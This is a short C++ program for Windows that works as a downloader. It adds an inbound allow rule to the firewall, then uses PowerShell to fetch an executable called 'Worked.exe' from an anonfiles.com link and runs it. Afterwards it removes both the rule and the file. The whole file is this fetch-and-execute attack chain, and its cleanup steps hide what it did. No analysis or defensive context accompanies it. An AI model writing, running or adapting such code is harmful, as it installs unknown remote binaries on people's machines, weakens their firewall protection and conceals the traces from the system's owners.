#include <iostream>
#include <cstdlib>
int main() {
    std::cout << "Create firewall exception\n";
    if(system("netsh advfirewall firewall add rule name=\"dEEpEst_RULE\" dir=in action=allow enable=yes") != 0) {
        std::cerr << "Failed to create firewall exception\n";
        return 1;
    }
    std::cout << "Download file\n";
    if(system("powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('https://cdn-153.anonfiles.com/V6r1ya51z3/855db534-1690765077/Worked.exe', 'Worked.exe')\"") != 0) {
        std::cerr << "Failed to download file\n";
        return 1;
    }
    std::cout << "Run file\n";
    if(system("Worked.exe") != 0) {
        std::cerr << "Failed to run file\n";
        return 1;
    }
    std::cout << "Remove firewall exception\n";
    system("pause");
    if(system("netsh advfirewall firewall delete rule name=\"dEEpEst_RULE\"") != 0) {
        std::cerr << "Failed to remove firewall exception\n";
        return 1;
    }
    std::cout << "Remove file\n";
    if(system("del Worked.exe") != 0) {
        std::cerr << "Failed to remove file\n";
        return 1;
    }
    std::cout << "Exit\n";
    return 0;
}
